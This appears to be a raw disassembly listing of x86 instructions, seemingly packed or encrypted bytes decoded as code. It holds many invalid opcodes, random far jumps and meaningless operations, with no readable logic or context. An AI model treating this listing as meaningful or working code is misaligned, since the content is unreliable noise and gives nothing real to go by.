  414eb7:	xchg   ebx,eax
  414eb8:	in     eax,dx
  414eb9:	inc    edx
  414eba:	mov    bl,0xe3
  414ebc:	es stos DWORD PTR es:[edi],eax
  414ebe:	xchg   ecx,eax
  414ebf:	lahf   
  414ec0:	lock jecxz 0x414f28
  414ec3:	scas   eax,DWORD PTR es:[edi]
  414ec4:	push   edi
  414ec5:	ss adc dl,dl
  414ec8:	xchg   edx,eax
  414ec9:	test   eax,0x27908aea
  414ece:	aad    0xd0
  414ed0:	lea    eax,[ebp-0x43cbb945]
  414ed6:	jbe    0x414ed1
  414ed8:	fcom   QWORD PTR [edx]
  414eda:	stc    
  414edb:	dec    esp
  414edc:	cmp    eax,DWORD PTR [esi+esi*8-0x29d9b8de]
  414ee3:	mov    ah,0xcd
  414ee5:	push   ss
  414ee6:	push   0x2b27516a
  414eeb:	sbb    ebp,DWORD PTR ds:0x62e965d6
  414ef1:	and    al,0x44
  414ef3:	push   edi
  414ef4:	inc    esi
  414ef5:	pop    ds
  414ef6:	out    dx,al
  414ef7:	inc    ebp
  414ef8:	sbb    BYTE PTR [edx+0x33],cl
  414efb:	in     eax,dx
  414efc:	outs   dx,BYTE PTR ds:[esi]
  414efd:	xchg   edi,eax
  414efe:	xor    ah,bh
  414f00:	loop   0x414ef2
  414f02:	cmp    ah,dl
  414f04:	fild   DWORD PTR [edx+0x47]
  414f07:	ret    0x3990
  414f0a:	push   esp
  414f0b:	jecxz  0x414f1b
  414f0d:	pop    esp
  414f0e:	mov    bl,BYTE PTR fs:[ebx+0x4c]
  414f12:	sub    eax,0x842e531
  414f17:	push   ebx
  414f18:	mov    DWORD PTR [ecx-0xb],ebp
  414f1b:	(bad)  
  414f1c:	adc    bh,BYTE PTR [edx-0x15]
  414f1f:	mov    bl,0xf
  414f21:	cli    
  414f22:	mov    ebp,0xaf8c94a9
  414f27:	cmc    
  414f28:	dec    ebp
  414f29:	adc    bh,bl
  414f2b:	push   esi
  414f2c:	pusha  
  414f2d:	mov    dl,0x98
  414f2f:	imul   ebp,DWORD PTR [esi+0x78],0xffffffab
  414f33:	push   cs
  414f34:	imul   esp,DWORD PTR [ecx+0x14704e3c],0xffffff9f
  414f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3c:	repnz fcmovnb st,st(1)
  414f3f:	dec    esi
  414f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f41:	or     BYTE PTR [esi],al
  414f43:	nop
  414f44:	xchg   ecx,eax
  414f45:	inc    esi
  414f46:	fmul   st(5),st
  414f48:	jbe    0x414f8a
  414f4a:	add    eax,0xe8d4d9b0
  414f4f:	dec    edi
  414f50:	pop    edx
  414f51:	pop    edi
  414f52:	pop    edi
  414f53:	sar    BYTE PTR [edx-0x151d13dd],1
  414f59:	sub    al,0x67
  414f5b:	es adc eax,0xabd1f72d
  414f61:	loope  0x414fb6
  414f63:	loopne 0x414eed
  414f65:	(bad)  
  414f66:	sbb    ebx,DWORD PTR [edi]
  414f68:	mov    edx,0x61c88ab1
  414f6d:	daa    
  414f6e:	cwde   
  414f6f:	std    
  414f70:	lods   al,BYTE PTR ds:[esi]
  414f71:	mov    dh,0x91
  414f73:	mov    eax,ds:0x69a40ec7
  414f78:	fnstenv [ebp+0x962911f]
  414f7e:	sahf   
  414f7f:	adc    bh,bl
  414f81:	inc    esi
  414f82:	(bad)  
  414f83:	ror    ah,cl
  414f85:	xor    eax,0xff90c10b
  414f8a:	std    
  414f8b:	lods   eax,DWORD PTR ds:[esi]
  414f8c:	inc    ebx
  414f8d:	ret    
  414f8e:	xor    al,0x8b
  414f90:	mov    ds:0xae48999e,eax
  414f95:	dec    esp
  414f96:	rcl    DWORD PTR [ecx+0x7f],1
  414f99:	arpl   WORD PTR [ecx-0x6655aaed],di
  414f9f:	lods   al,BYTE PTR ds:[esi]
  414fa0:	sbb    bh,cl
  414fa2:	in     eax,dx
  414fa3:	lahf   
  414fa4:	into   
  414fa5:	std    
  414fa6:	jecxz  0x414f67
  414fa8:	lods   eax,DWORD PTR ds:[esi]
  414fa9:	inc    esi
  414faa:	add    ecx,DWORD PTR [edx]
  414fac:	jo     0x414f4a
  414fae:	hlt    
  414faf:	mov    ch,0x3
  414fb1:	mov    bh,0x1d
  414fb3:	mov    cl,0xff
  414fb5:	sub    al,0x69
  414fb7:	or     bl,al
  414fb9:	mov    ebp,DWORD PTR [eax+0x20330484]
  414fbf:	pop    edi
  414fc0:	xchg   ecx,eax
  414fc1:	pop    ds
  414fc2:	js     0x414f50
  414fc4:	xchg   ebx,eax
  414fc5:	fidivr DWORD PTR [ecx+0x10]
  414fc8:	jo     0x41502f
  414fca:	or     ebx,ebx
  414fcc:	bound  ebp,QWORD PTR [edi+0x49961337]
  414fd2:	cwde   
  414fd3:	adc    dl,BYTE PTR [ebp+0x6b468f07]
  414fd9:	xchg   BYTE PTR [esp+edx*8],ch
  414fdc:	cdq    
  414fdd:	ins    DWORD PTR es:[edi],dx
  414fde:	add    al,0xe4
  414fe0:	and    cl,bl
  414fe2:	mov    edi,ebp
  414fe4:	out    0x3e,eax
  414fe6:	into   
  414fe7:	daa    
  414fe8:	test   eax,0x574e4ca6
  414fed:	sar    DWORD PTR [esi],1
  414fef:	xor    eax,0x7ed24eef
  414ff4:	adc    BYTE PTR [edi],bh
  414ff6:	mov    bh,bh
  414ff8:	xor    esi,DWORD PTR [ebx-0x7b015ad8]
  414ffe:	mov    ds:0x1d8ffa06,al
  415003:	arpl   WORD PTR [edi+0x4f],bp
  415006:	mov    bh,0x8d
  415008:	outs   dx,BYTE PTR ds:[esi]
  415009:	pop    esp
  41500a:	dec    DWORD PTR [ebx+0x23]
  41500d:	sub    BYTE PTR [edi-0x4a3d7178],cl
  415013:	in     eax,0x7f
  415015:	out    dx,al
  415016:	ins    DWORD PTR es:[edi],dx
  415017:	mov    esi,0xec52b908
  41501c:	ret    
  41501d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501e:	sub    dl,BYTE PTR [ebx-0x69]
  415021:	sub    BYTE PTR [ecx-0x15d2ddb6],ah
  415027:	aas    
  415028:	call   0xba4e8d41
  41502d:	or     BYTE PTR [eax-0x5f],ch
  415030:	dec    esp
  415031:	sbb    al,0x4c
  415033:	lods   al,BYTE PTR ds:[esi]
  415034:	push   eax
  415035:	fstp   TBYTE PTR [edi-0x59]
  415038:	xchg   ecx,eax
  415039:	jno    0x414fcc
  41503b:	dec    esi
  41503c:	inc    edx
  41503d:	pand   mm1,QWORD PTR [edi-0x46903d10]
  415044:	(bad)  
  415045:	pop    esi
  415046:	push   esp
  415047:	cmp    BYTE PTR [esi],dl
  415049:	xor    DWORD PTR [edx-0x2f9449e1],eax
  41504f:	dec    ebp
  415050:	or     al,0x33
  415052:	pop    es
  415053:	add    DWORD PTR [edx+0x1042ea75],ebx
  415059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41505a:	call   0x187a:0xfb4c471a
  415061:	adc    ebx,DWORD PTR [esi+edi*8-0x27]
  415065:	sub    BYTE PTR [ebx-0x7],dl
  415068:	dec    ebx
  415069:	add    edi,DWORD PTR [ebp-0x46]
  41506c:	cmp    BYTE PTR ds:0x48b4425a,ch
  415072:	cmp    eax,0x9ad7ba8c
  415077:	test   eax,0xfd5bbc93
  41507c:	push   es
  41507d:	cmp    eax,0x18cdf7a9
  415082:	sub    DWORD PTR [eax-0x6],ecx
  415085:	mov    ecx,0x3ca3fc7b
  41508a:	mov    edx,0xadc4d4eb
  41508f:	mov    ch,0xf
  415091:	(bad)  
  415092:	loopne 0x41507d
  415094:	sti    
  415095:	aas    
  415096:	retf   0xeb57
  415099:	sbb    BYTE PTR [ecx+ebx*4],0xda
  41509d:	stos   BYTE PTR es:[edi],al
  41509e:	fs std 
  4150a0:	push   ecx
  4150a1:	mov    ebp,0x76db1e1e
  4150a6:	sbb    DWORD PTR [eax-0x4],esp
  4150a9:	enter  0xc8c5,0x38
  4150ad:	addr16 mov ebp,0x3daa9daf
  4150b3:	lods   al,BYTE PTR ds:[esi]
  4150b4:	cld    
  4150b5:	retf   0xdd00
  4150b8:	sbb    DWORD PTR [esi+0x2],0xe5142fc7
  4150bf:	push   ss
  4150c0:	inc    esi
  4150c1:	enter  0xd3f5,0x36
  4150c5:	(bad)  
  4150c7:	dec    ebx
  4150c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c9:	add    edx,DWORD PTR [edx]
  4150cb:	out    dx,al
  4150cc:	fs inc esi
  4150ce:	sbb    al,0x83
  4150d0:	es iret 
  4150d2:	pand   mm0,QWORD PTR [esi+0x5c]
  4150d6:	out    dx,al
  4150d7:	or     BYTE PTR [esi],bl
  4150d9:	dec    esi
  4150da:	pop    ebp
  4150db:	jl     0x4150d7
  4150dd:	push   esp
  4150de:	push   ecx
  4150df:	mov    fs,ebp
  4150e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150e2:	fisubr DWORD PTR [esi+0x2]
  4150e5:	jl     0x415083
  4150e7:	imul   ebx,DWORD PTR [esi+0x24],0xffffffe8
  4150eb:	sub    ebx,ebx
  4150ed:	xchg   ebx,eax
  4150ee:	adc    eax,0x11251303
  4150f3:	push   esi
  4150f4:	mov    ?,WORD PTR [ebp-0x21]
  4150f7:	xchg   ebp,eax
  4150f8:	and    al,0xea
  4150fa:	jmp    0x4d6373d9
  4150ff:	(bad)  
  415100:	scas   al,BYTE PTR es:[edi]
  415101:	jno    0x41517d
  415103:	sti    
  415104:	shl    BYTE PTR [eax-0x51],1
  415107:	dec    esp
  415108:	and    eax,0x16bc595b
  41510d:	mov    ebx,0x208bafe9
  415112:	add    ebx,edx
  415114:	jmp    0xe065:0xc9faecd4
  41511b:	pop    es
  41511c:	out    0xd2,al
  41511e:	pop    ss
  41511f:	mov    bh,0xd8
  415121:	shr    DWORD PTR [ebx],0xc1
  415124:	xor    DWORD PTR [edi-0x5c6b25d6],ebx
  41512a:	ja     0x41518e
  41512c:	je     0x415113
  41512e:	mov    eax,ds:0xf56e6f96
  415133:	sbb    eax,0x9d94e7f3
  415138:	cli    
  415139:	push   0x8
  41513b:	dec    ebp
  41513c:	sbb    DWORD PTR [eax+esi*8+0x1ea12615],ebp
  415143:	xchg   esi,eax
  415144:	sub    ebp,DWORD PTR [ebp-0x493e4103]
  41514a:	cmp    bl,BYTE PTR [eax-0x1fc8445a]
  415150:	(bad)  
  415151:	div    DWORD PTR [ebp+ebp*1-0x49]
  415155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415156:	call   0x2089:0x34c33eb3
  41515d:	xor    eax,0xd276ed57
  415162:	sar    DWORD PTR [bp+si-0x62],0x40
  415167:	push   edx
  415168:	xor    ebp,DWORD PTR [edi-0x6cb2519b]
  41516e:	jmp    0x6c3:0x7b267bfa
  415175:	xor    bh,ah
  415177:	or     cl,BYTE PTR [esi]
  415179:	dec    edi
  41517a:	in     eax,0xac
  41517c:	(bad)  
  41517d:	push   esi
  41517e:	aaa    
  41517f:	ficom  DWORD PTR [ebx+0x17]
  415182:	mov    DWORD PTR [ecx+0x12],ebx
  415185:	cwde   
  415186:	adc    eax,0x4b8bf239
  41518b:	and    eax,0x5e8b8e62
  415190:	cmp    BYTE PTR [edi-0x58],dh
  415193:	ja     0x41514c
  415195:	loop   0x41520e
  415197:	dec    ebp
  415198:	mov    esp,0xe33ebb8c
  41519d:	inc    ebx
  41519e:	jbe    0x415128
  4151a0:	rol    BYTE PTR fs:[edi-0x7b9e80bc],0x87
  4151a8:	rol    DWORD PTR [esp+eiz*2-0x51c9e736],cl
  4151af:	loop   0x415217
  4151b1:	cmovns edi,edi
  4151b4:	sti    
  4151b5:	or     dl,BYTE PTR [esi-0x32c1078c]
  4151bb:	ja     0x4151c9
  4151bd:	div    BYTE PTR [eax+0x582bb496]
  4151c3:	mov    ecx,0x19d62cca
  4151c8:	pushf  
  4151c9:	push   ebp
  4151ca:	mov    DWORD PTR [esi],ebx
  4151cc:	popf   
  4151cd:	aaa    
  4151ce:	mov    edi,0x3bbbb933
  4151d3:	pop    ecx
  4151d4:	xorps  xmm1,XMMWORD PTR [esi+ebp*4+0x6]
  4151d9:	or     al,0xb7
  4151db:	fwait
  4151dc:	sub    eax,0x4293c0d3
  4151e1:	push   0x2c
  4151e3:	lods   al,BYTE PTR ds:[esi]
  4151e4:	inc    ebp
  4151e5:	test   al,0x69
  4151e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151e8:	sbb    edx,DWORD PTR [eax+0x6eae8579]
  4151ee:	inc    esi
  4151ef:	add    esp,DWORD PTR [esi+0x25]
  4151f2:	dec    eax
  4151f3:	mov    dh,BYTE PTR [ecx+0x3c]
  4151f6:	mov    ds:0xc774a673,al
  4151fb:	jmp    DWORD PTR [eax+0x5f]
  4151fe:	or     DWORD PTR [edx],eax
  415200:	adc    BYTE PTR [eax-0x368a78d9],0x89
  415207:	test   BYTE PTR [edx-0x593b36b2],bh
  41520d:	mov    WORD PTR [eax+0x3f],ss
  415210:	jp     0x41525d
  415212:	sub    al,0xfe
  415214:	cli    
  415215:	(bad)  
  415216:	fild   QWORD PTR [esi+0x36681f3]
  41521c:	jmp    0x8d43c029
  415221:	test   DWORD PTR [eax-0x34db7c62],esp
  415227:	inc    edx
  415228:	adc    DWORD PTR [edi-0x191f9e25],ebp
  41522e:	sbb    BYTE PTR [ebp+0x8],bh
  415231:	xchg   BYTE PTR [edi],dl
  415233:	lea    edx,[eax]
  415235:	push   edx
  415236:	push   ss
  415237:	pop    ds
  415238:	sub    ebp,edx
  41523a:	sbb    DWORD PTR [edx],0xb920a714
  415240:	popa   
  415241:	lahf   
  415242:	mov    eax,ds:0x5882751
  415247:	xor    al,0x29
  415249:	pop    ss
  41524a:	xchg   DWORD PTR [ebx+ebp*8],edi
  41524d:	and    DWORD PTR [eax+0x52edfd2f],0x67480820
  415257:	lods   eax,DWORD PTR ds:[esi]
  415258:	(bad)  
  415259:	(bad)  
  41525a:	out    dx,al
  41525b:	cli    
  41525c:	and    al,0xd6
  41525e:	cdq    
  41525f:	arpl   cx,sp
  415261:	mov    cs,WORD PTR [edx]
  415263:	enter  0x7bde,0x29
  415267:	mov    bl,BYTE PTR [ebp-0x7c43924c]
  41526d:	xor    eax,DWORD PTR cs:[edx-0x3868781b]
  415274:	pop    ebp
  415275:	sub    dl,BYTE PTR [ecx-0x30]
  415278:	jle    0x415285
  41527a:	outs   dx,BYTE PTR ds:[esi]
  41527b:	sub    BYTE PTR [ebx+eax*1-0x75678f59],al
  415282:	adc    BYTE PTR [esi+eiz*4-0x2b8c253f],al
  415289:	add    BYTE PTR [eax-0x3a0e1f9e],dl
  41528f:	add    DWORD PTR [ecx],esi
  415291:	xor    eax,0x389c8153
  415296:	push   cs
  415297:	mov    ah,0x1d
  415299:	jge    0x415221
  41529b:	imul   edx,eax,0x851d9edc
  4152a1:	or     ecx,DWORD PTR [ebp+0x275dd86c]
  4152a7:	mov    ecx,0xdcecdce1
  4152ac:	call   0xf197fb6f
  4152b1:	push   cs
  4152b2:	mov    al,ds:0x851db35d
  4152b7:	aam    0x6a
  4152b9:	ins    BYTE PTR es:[edi],dx
  4152ba:	int    0x8f
  4152bc:	and    ah,BYTE PTR [ebx-0x2029f590]
  4152c2:	imul   DWORD PTR [ebx]
  4152c4:	mov    dl,0x37
  4152c6:	fisub  WORD PTR [ebp-0x75718241]
  4152cc:	xchg   BYTE PTR [esp+ebp*8-0xd06668a],bh
  4152d3:	adc    ebx,ebp
  4152d5:	mov    ?,WORD PTR [eax+0x2]
  4152d8:	xor    bl,BYTE PTR [edx+edx*1]
  4152db:	dec    edx
  4152dc:	hlt    
  4152dd:	imul   esi,DWORD PTR [esp+ecx*4],0xdb172d4f
  4152e4:	cli    
  4152e5:	push   0x34
  4152e7:	mov    eax,0x9b11ff60
  4152ec:	leave  
  4152ed:	shl    DWORD PTR [eax],0x98
  4152f0:	cmp    DWORD PTR [esi-0x3],esi
  4152f3:	mov    ch,0xf3
  4152f5:	add    BYTE PTR [edx-0x3b],al
  4152f8:	outs   dx,BYTE PTR ds:[esi]
  4152f9:	loope  0x4152d4
  4152fb:	mov    edx,eax
  4152fd:	call   ecx
  4152ff:	adc    ecx,DWORD PTR [ecx]
  415301:	iret   
  415302:	dec    ecx
  415303:	pop    ecx
  415304:	jb     0x415370
  415306:	xchg   DWORD PTR [edi+0x52],edi
  415309:	push   esi
  41530a:	stos   DWORD PTR es:[edi],eax
  41530b:	cmc    
  41530c:	mov    esp,DWORD PTR [ebp+0x2127b9b8]
  415312:	push   cs
  415313:	(bad)  
  415314:	out    0x29,eax
  415316:	xchg   esp,eax
  415317:	pop    ss
  415318:	inc    esi
  415319:	in     eax,dx
  41531a:	jmp    0x4152b7
  41531c:	shr    BYTE PTR [ebp-0x6df8d86],1
  415322:	repz mov ch,0xe3
  415325:	and    BYTE PTR [ecx],cl
  415327:	or     cl,ah
  415329:	pop    ds
  41532a:	sub    DWORD PTR [ebx-0x5bf641d5],0xffffff87
  415331:	xor    eax,0x245eb4f2
  415336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415337:	add    eax,0x11cd7bae
  41533c:	mov    dh,0xf0
  41533e:	mov    al,0x84
  415340:	std    
  415341:	push   cs
  415342:	lds    esp,FWORD PTR [edx-0x7be7e341]
  415348:	dec    eax
  415349:	push   es
  41534a:	or     al,ah
  41534c:	pop    edx
  41534d:	jge    0x4152d6
  41534f:	jle    0x41530f
  415351:	fcom   DWORD PTR [edx+0x58]
  415354:	outs   dx,DWORD PTR ds:[esi]
  415355:	lods   al,BYTE PTR ds:[esi]
  415356:	loop   0x415395
  415358:	imul   eax,DWORD PTR [ecx+0x2687c95f],0xfffffff2
  41535f:	stos   DWORD PTR es:[edi],eax
  415360:	imul   edi,DWORD PTR [edx+ebp*1+0xbafda64],0x818988ec
  41536b:	adc    DWORD PTR [ecx+0x23],ebp
  41536e:	fisubr DWORD PTR [esi-0x29]
  415371:	arpl   WORD PTR [edx],bx
  415373:	adc    eax,0x8ee48448
  415378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415379:	push   es
  41537a:	inc    eax
  41537b:	add    al,0xd0
  41537d:	sub    cl,BYTE PTR [esi-0x8]
  415380:	adc    DWORD PTR [ebx+esi*4],ebx
  415383:	ja     0x415314
  415385:	fisubr WORD PTR [esi+edi*1-0x42]
  415389:	xor    ebp,DWORD PTR [edx]
  41538b:	push   ebx
  41538c:	inc    bx
  41538e:	jp     0x4153fe
  415390:	lods   al,BYTE PTR ds:[esi]
  415391:	pop    ebx
  415392:	imul   ebx,DWORD PTR [eax+0x54],0x2a
  415396:	dec    eax
  415397:	mov    fs,WORD PTR [edi+0x4d4c7f0e]
  41539d:	clc    
  41539e:	sub    dh,BYTE PTR [ebx+0x48]
  4153a1:	sbb    al,0xdc
  4153a3:	sti    
  4153a4:	cmp    cl,bh
  4153a6:	jmp    0xc712:0xffe3d1e7
  4153ad:	sahf   
  4153ae:	push   ss
  4153af:	mov    ds:0x25965527,al
  4153b4:	mov    ch,bl
  4153b6:	ins    BYTE PTR es:[edi],dx
  4153b7:	push   cs
  4153b8:	loope  0x415416
  4153ba:	(bad)  
  4153bb:	fcomp  st(2)
  4153bd:	sub    al,0x61
  4153bf:	ja     0x4153fd
  4153c1:	mov    al,0xd9
  4153c3:	in     eax,0x18
  4153c5:	inc    edi
  4153c6:	or     DWORD PTR [esi+0x7ce139d6],edi
  4153cc:	xlat   BYTE PTR ds:[ebx]
  4153cd:	push   ds
  4153ce:	inc    ebp
  4153cf:	les    esp,FWORD PTR [eax-0x4f237b23]
  4153d5:	xchg   edx,eax
  4153d6:	and    eax,0x660bec1e
  4153db:	mov    ds:0x4bf53d2a,eax
  4153e0:	in     eax,0xc3
  4153e2:	sbb    BYTE PTR [ebx+0x4c],ch
  4153e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153e6:	sub    DWORD PTR [edi+0x3cdf63bb],0xffffff85
  4153ed:	repz adc ebx,DWORD PTR [ebp-0x61]
  4153f1:	not    DWORD PTR [eax+edx*8]
  4153f4:	mov    cl,0xca
  4153f6:	das    
  4153f7:	inc    ebp
  4153f8:	popf   
  4153f9:	xlat   BYTE PTR ds:[ebx]
  4153fa:	jecxz  0x41541a
  4153fc:	ds dec ebx
  4153fe:	int3   
  4153ff:	xlat   BYTE PTR ds:[ebx]
  415400:	test   esp,0xc59f0369
  415406:	cwde   
  415407:	pop    edi
  415408:	dec    ecx
  415409:	in     eax,0xe6
  41540b:	mov    eax,0xc4c8b478
  415410:	xchg   edi,eax
  415411:	in     eax,0xa2
  415413:	and    ebx,DWORD PTR [edx+0x2e]
  415416:	arpl   WORD PTR [eax+ecx*1-0x33],di
  41541a:	xchg   BYTE PTR [ecx+0x27],bh
  41541d:	aam    0x3d
  41541f:	sar    BYTE PTR [ecx+edi*4-0x26],cl
  415423:	(bad)  
  415424:	mov    ebp,0x5194b8a8
  415429:	push   ebx
  41542a:	fstp   QWORD PTR [edx]
  41542c:	or     ch,ch
  41542e:	out    0x1f,al
  415430:	ret    
  415431:	and    DWORD PTR [eax],0x65
  415434:	pop    ebx
  415435:	push   esp
  415437:	push   ds
  415438:	fcom   DWORD PTR [ebx-0x78]
  41543b:	mov    ebx,0x890a4d70
  415440:	ins    DWORD PTR es:[edi],dx
  415441:	xchg   edi,eax
  415442:	adc    eax,0x9499c53c
  415447:	xor    ebp,DWORD PTR [ecx-0x1c]
  41544a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544b:	stos   BYTE PTR es:[edi],al
  41544c:	add    BYTE PTR [ebx-0x5cf07f4a],0x9b
  415453:	in     eax,dx
  415454:	push   edi
  415455:	lods   al,BYTE PTR ds:[esi]
  415456:	cmc    
  415457:	fcomp  QWORD PTR [ecx+0x2c058dcd]
  41545d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41545e:	in     al,dx
  41545f:	(bad)  [eax+0x5a64a2a6]
  415465:	sub    ch,al
  415467:	push   ebx
  415468:	adc    BYTE PTR [eax],0xa0
  41546b:	sbb    edx,DWORD PTR [eax-0x2d8a6b02]
  415471:	cmp    BYTE PTR [eax-0x1f],0xc3
  415475:	arpl   WORD PTR [ebx],dx
  415477:	rol    DWORD PTR [edx+0x656c8a59],cl
  41547d:	inc    ebp
  41547e:	ffree  st(4)
  415480:	jp     0x4154e5
  415482:	outs   dx,DWORD PTR ds:[esi]
  415483:	aam    0x63
  415485:	nop
  415486:	das    
  415487:	ret    
  415488:	mov    dh,BYTE PTR [edx-0x55]
  41548b:	test   ah,bh
  41548d:	xchg   ecx,eax
  41548e:	adc    eax,edi
  415490:	cs pop eax
  415492:	fwait
  415493:	repz gs jnp 0x415466
  415497:	jbe    0x4154cc
  415499:	pop    esp
  41549a:	xchg   esi,eax
  41549b:	adc    dh,BYTE PTR [ecx-0x5e882433]
  4154a1:	add    al,0x45
  4154a3:	inc    edx
  4154a4:	mul    BYTE PTR [esi+0x21]
  4154a7:	pop    eax
  4154a8:	lds    ebp,FWORD PTR [edx]
  4154aa:	mov    cl,0xc1
  4154ac:	clc    
  4154ad:	xor    al,0x46
  4154af:	(bad)  
  4154b1:	sub    esp,DWORD PTR [edi]
  4154b3:	mov    al,0x70
  4154b5:	retf   
  4154b6:	add    al,0x4c
  4154b8:	sbb    cl,BYTE PTR [edx-0x2435bdba]
  4154be:	mov    cl,0xce
  4154c0:	popa   
  4154c1:	jb     0x4154a8
  4154c3:	jmp    0xca29:0xcc016c6b
  4154ca:	lds    ebx,FWORD PTR [esi]
  4154cc:	(bad)  
  4154cd:	pop    edi
  4154ce:	mov    esp,ds
  4154d0:	pop    ecx
  4154d1:	das    
  4154d2:	scas   eax,DWORD PTR es:[edi]
  4154d3:	mov    ch,0x43
  4154d5:	icebp  
  4154d6:	xlat   BYTE PTR ds:[ebx]
  4154d7:	push   esp
  4154d8:	cdq    
  4154d9:	xor    al,0x95
  4154db:	rcl    BYTE PTR [ebp+0x64],cl
  4154de:	mov    gs,WORD PTR [ecx+0x3d52c5a0]
  4154e4:	jge    0x415542
  4154e6:	or     esp,DWORD PTR [ecx]
  4154e8:	cmp    al,0x12
  4154ea:	push   es
  4154eb:	out    dx,al
  4154ec:	dec    ebx
  4154ed:	nop
  4154ee:	pop    eax
  4154ef:	std    
  4154f0:	mov    ss,WORD PTR [esi]
  4154f2:	mov    dl,0x76
  4154f4:	mov    esp,0x52034ac5
  4154f9:	sbb    bl,BYTE PTR [esi-0x441a93a1]
  4154ff:	ins    BYTE PTR es:[edi],dx
  415500:	test   al,0x4e
  415502:	stos   BYTE PTR es:[edi],al
  415503:	in     eax,0x8c
  415505:	arpl   dx,sp
  415507:	mov    esp,DWORD PTR [eax-0x55]
  41550a:	ds inc esi
  41550c:	ret    
  41550d:	lods   eax,DWORD PTR ds:[esi]
  41550e:	pushf  
  41550f:	mov    ecx,0x45f2e0ca
  415514:	iret   
  415515:	pop    esi
  415516:	bound  esi,QWORD PTR [ebx+0x3d432365]
  41551c:	(bad)  
  41551d:	dec    esp
  41551e:	(bad)  
  41551f:	mov    ebx,0x8cc25484
  415524:	inc    edx
  415525:	fsub   DWORD PTR [eax]
  415527:	xchg   edx,eax
  415528:	push   edx
  415529:	push   ebp
  41552a:	adc    al,0x50
  41552c:	xor    al,0x6e
  41552e:	cdq    
  41552f:	ja     0x41550e
  415531:	jns    0x415562
  415533:	push   0xfffffffb
  415535:	lods   eax,DWORD PTR ds:[esi]
  415536:	test   eax,0x69917774
  41553b:	fcomp  DWORD PTR [ebp+0x30]
  41553e:	mov    WORD PTR gs:[edi],es
  415541:	in     eax,0x2e
  415543:	mov    eax,0x5a2d287d
  415548:	dec    ecx
  415549:	and    cl,cl
  41554b:	cwde   
  41554c:	sub    esi,DWORD PTR cs:[ebx+0x61]
  415550:	mov    BYTE PTR [bx+si-0x6892],dl
  415555:	adc    ecx,ebp
  415557:	xchg   ebp,eax
  415558:	inc    ebp
  415559:	das    
  41555a:	stos   BYTE PTR es:[edi],al
  41555b:	adc    eax,0xe5c479b4
  415560:	ins    DWORD PTR es:[edi],dx
  415561:	dec    edx
  415562:	fs std 
  415564:	test   DWORD PTR [edi],0xd12b2d62
  41556a:	mov    bl,BYTE PTR [edx+eiz*1-0x3d]
  41556e:	mov    bh,0xf4
  415570:	adc    edi,ebp
  415572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415573:	ror    BYTE PTR [ebx-0x4e],1
  415576:	dec    ebx
  415577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415578:	mov    edi,0xfce0d0ff
  41557d:	xchg   ebp,eax
  41557e:	arpl   WORD PTR [esi+ebx*4],ax
  415581:	and    edx,DWORD PTR fs:[edi]
  415584:	aaa    
  415585:	cmp    eax,0x202db37b
  41558a:	xlat   BYTE PTR ds:[ebx]
  41558b:	stos   DWORD PTR es:[edi],eax
  41558c:	fiadd  DWORD PTR [ebp-0x20d97755]
  415592:	loope  0x4155e9
  415594:	and    DWORD PTR [edi-0x479bb1d],0x4bbf82d9
  41559e:	daa    
  41559f:	hlt    
  4155a0:	or     BYTE PTR [ecx],ch
  4155a2:	ss dec ecx
  4155a4:	inc    ebx
  4155a5:	std    
  4155a6:	adc    DWORD PTR [ebp+0x5d],ecx
  4155a9:	and    DWORD PTR [esi+0x28],edi
  4155ac:	or     BYTE PTR [ebp-0x38],cl
  4155af:	cmp    esp,edi
  4155b1:	mov    cl,0x3b
  4155b3:	jmpw   0x539e
  4155b7:	(bad)  
  4155b8:	out    dx,al
  4155b9:	(bad)  
  4155ba:	out    dx,eax
  4155bb:	mov    DWORD PTR [esi],esi
  4155bd:	data16 mov ah,bh
  4155c0:	xchg   esp,eax
  4155c1:	mov    ebx,eax
  4155c3:	scas   al,BYTE PTR es:[edi]
  4155c4:	(bad)  
  4155c5:	lods   eax,DWORD PTR ds:[esi]
  4155c6:	inc    edi
  4155c7:	inc    ebp
  4155c8:	icebp  
  4155c9:	sub    al,0x6f
  4155cb:	lahf   
  4155cc:	loop   0x415593
  4155ce:	jg     0x41559d
  4155d0:	mov    al,ds:0x54f16f61
  4155d5:	gs mov edx,0xa1f2d69c
  4155db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155dc:	mov    dl,0x74
  4155de:	adc    BYTE PTR [esi-0x75b01730],ah
  4155e4:	ret    0x943a
  4155e7:	sub    ah,ah
  4155e9:	inc    edx
  4155ea:	adc    BYTE PTR [edx-0x2937bcd],bl
  4155f0:	lahf   
  4155f1:	mov    DWORD PTR [ecx-0x59],esi
  4155f4:	fld    DWORD PTR [esi]
  4155f6:	pop    esp
  4155f7:	fidiv  DWORD PTR [eax+0x19031162]
  4155fd:	mov    ebp,0xfc4e3a91
  415602:	inc    ebp
  415603:	adc    ah,bh
  415605:	sub    al,0xbc
  415607:	lods   eax,DWORD PTR ds:[esi]
  415608:	sbb    eax,0xffb56750
  41560d:	push   ds
  41560e:	jg     0x4155dc
  415610:	addr16 jbe 0x4155ab
  415613:	icebp  
  415614:	(bad)  
  415615:	sbb    eax,0x403f2b39
  41561a:	rcl    DWORD PTR [esi+0xc38e2e6],cl
  415620:	xchg   ebx,eax
  415621:	jno    0x415663
  415623:	int    0xb4
  415625:	mov    al,0xe6
  415627:	daa    
  415628:	dec    ebp
  415629:	ret    0x83c9
  41562c:	loop   0x41566c
  41562e:	xchg   ebx,eax
  41562f:	sub    al,0xc1
  415631:	scas   al,BYTE PTR es:[edi]
  415632:	or     DWORD PTR [ebp+ebp*4-0x3df0947c],ecx
  415639:	sbb    al,0xf2
